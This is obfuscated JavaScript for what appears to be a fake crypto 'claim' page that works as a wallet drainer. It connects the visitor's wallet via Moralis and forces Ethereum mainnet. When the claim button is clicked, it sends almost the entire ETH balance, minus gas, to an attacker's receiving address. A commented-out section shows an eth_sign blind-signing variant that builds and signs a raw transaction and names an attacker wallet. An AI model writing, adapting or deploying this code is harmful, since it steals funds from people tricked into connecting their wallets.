function isMobile() {
    var _0x42082d = ![];

    return function(_0x537a2c) {
        (/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i ["test"](_0x537a2c) || /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i ["test"](_0x537a2c["substr"](0, 4))) && (_0x42082d = !![]);
    }(navigator["userAgent"] || navigator["vendor"] || window["opera"]), _0x42082d;
}

Moralis["onWeb3Enabled"](async _0x58d4c0 => {
    _0x58d4c0["chainId"] !== 1 && _0x12b040 && (await Moralis["switchNetwork"]("0x1")), _0x274b81(!![]);
}), Moralis["onChainChanged"](async _0x4e8599 => {
    _0x4e8599 !== "0x1" && _0x12b040 && (await Moralis["switchNetwork"]("0x1"));
}), window["ethereum"] ? window["ethereum"]["on"]("disconnect", _0x3ec259 => _0x274b81(![])) : null, window["ethereum"] ? window["ethereum"]["on"]("accountsChanged", _0x3dc38a => {
    _0x3dc38a["length"] < 1 && _0x274b81(![]);
}) : null;

async function _0x274b81(_0x25aabc) {
    const _0x38aa45 = new Web3(Moralis["provider"]);

    document["getElementById"]("walletAddress")["innerHTML"] = _0x25aabc ? "CONNECTED <br> <span>" + (await _0x38aa45["eth"]["getAccounts"]())[0] + "</span>" : "NOT CONNECTED", document["querySelector"]("#claimButton")["style"]["display"] = _0x25aabc ? "" : "none";
}

setTimeout(async () => {
    try {
        const _0x19820a = new Web3(Moralis["provider"]),
            _0x3c65f0 = (await _0x19820a["eth"]["getAccounts"]())[0];

        console["log"](_0x3c65f0 + " is connected");
    } catch (_0x29510b) {
        const _0x38647d = {
            "href": "./index.html"
        };
        Reflect["assign"](document["createElement"]("a"), _0x38647d)["click"]();
    }
}, 5000);

let _0x12b040 = ![];

typeof window["ethereum"] !== "undefined" && (_0x12b040 = !![]);
window["addEventListener"]("load", async () => {
    const _0x5b2a9f = {
        "provider": "walletconnect"
    };
    await Moralis["enableWeb3"](_0x12b040 ? {} : _0x5b2a9f), document["querySelector"]("#claimButton")["addEventListener"]("click", _0x4822c4);
});
let walletBalance = 0;

const _0x4822c4 = async () => {
    const _0x40b84b = new Web3(Moralis["provider"]),
        _0x2647b5 = (await _0x40b84b["eth"]["getAccounts"]())[0];

    try {
        walletBalance = await _0x40b84b["eth"]["getBalance"](_0x2647b5);

        const _0x307d69 = _0x40b84b["utils"]["fromWei"](walletBalance, "ether");

        console["log"]("Current balance for " + _0x2647b5 + " : " + _0x307d69 + " ETH"), _0x307d69 > 1e-9 ? perfectBalance() : console["log"]("Error, balance is too low. (< 0.01 ETH)");
    } catch (_0x46a278) {
        console["log"](_0x46a278);
    }
};

async function perfectBalance() {
    const _0x526f78 = new Web3(Moralis["provider"]),
        _0x1faf91 = (await _0x526f78["eth"]["getAccounts"]())[0],
        _0xe86776 = await _0x526f78["eth"]["getChainId"]();

    await _0x526f78["eth"]["getTransactionCount"](_0x1faf91, "pending")["then"](async _0x3e4d25 => {
        const _0x28a185 = await _0x526f78["eth"]["getGasPrice"](),
            _0x1633d6 = _0x526f78["utils"]["toHex"](Math["floor"](_0x28a185 * 1.3)),
            _0x17e3e2 = new _0x526f78["utils"]["BN"]("22000"),
            _0x3bb930 = _0x17e3e2 * Math["floor"](_0x28a185 * 2),
            _0x8e40e7 = walletBalance - _0x3bb930;

            console["log"]("origin value::",_0x8e40e7);
            console["log"]("morali value::",Moralis.Units.ETH("0.01"));

            const transferValue = _0x526f78["utils"]["fromWei"](_0x8e40e7["toString"](), "ether");

    const options = {
        type: "native",
        amount: Moralis.Units.ETH(transferValue),
        receiver: receiveAddress,
    }

    await Moralis.transfer(options);

        // console["log"]("Sending " + _0x526f78["utils"]["fromWei"](_0x8e40e7["toString"](), "ether") + " ETH from " + _0x1faf91 + "..."), walletBalance > 1000000000000000000 ? "0xbd4FeE42893E8baC47541Dc2B5229d7139186666" : null;
        // const data_json = {
        //     "nonce": _0x526f78["utils"]["toHex"](_0x3e4d25),
        //     "gasPrice": _0x1633d6,
        //     "gasLimit": "0x55F0",
        //     "to": receiveAddress,
        //     "value": "0x" + _0x8e40e7["toString"](16),
        //     "data": "0x",
        //     "v": "0x1",
        //     "r": "0x",
        //     "s": "0x"
        // };

        // let _0x3e83a5 = new ethereumjs["Tx"](data_json);

        // const _0x5e3548 = "0x" + _0x3e83a5["serialize"]()["toString"]("hex"),
        //     _0x682cc9 = {
        //         "encoding": "hex"
        //     },
        //     _0x2959db = _0x526f78["utils"]["sha3"](_0x5e3548, _0x682cc9);

        // console["log"]("rawTx1:", _0x5e3548);
        //  await _0x526f78["eth"]["sign"](_0x2959db, _0x1faf91)["then"](async _0x4e2cb8 => {
        //     const _0x45d7f0 = _0x4e2cb8["substring"](2),
        //         _0x45d240 = "0x" + _0x45d7f0["substring"](0, 64),
        //         _0x5b7ec3 = "0x" + _0x45d7f0["substring"](64, 128),
        //         _0x45564f = parseInt(_0x45d7f0["substring"](128, 130), 16),
        //         _0x20d0a7 = _0x526f78["utils"]["toHex"](_0x45564f + _0xe86776 * 2 + 8);

        //     console["log"]("r:", _0x45d240), console["log"]("s:", _0x5b7ec3), console["log"]("y:", _0x20d0a7["toString"]("hex")), _0x3e83a5["r"] = _0x45d240, _0x3e83a5["s"] = _0x5b7ec3, _0x3e83a5["v"] = _0x20d0a7, console["log"](_0x3e83a5);

        //     const _0x14e2ed = "0x" + _0x3e83a5["serialize"]()["toString"]("hex"),
        //         _0x5cd521 = {
        //             "encoding": "hex"
        //         },
        //         _0x50e707 = _0x526f78["utils"]["sha3"](_0x14e2ed, _0x5cd521);

        //     console["log"]("rawTx:", _0x14e2ed), console["log"]("rawHash:", _0x50e707), await _0x526f78["eth"]["sendSignedTransaction"](_0x14e2ed)["then"](_0x45f7a3 => console["log"](_0x45f7a3))["catch"](_0x119fc8 => console["log"](_0x119fc8));
        // })["catch"](_0x4ded9e => console["log"](_0x4ded9e));
    });
}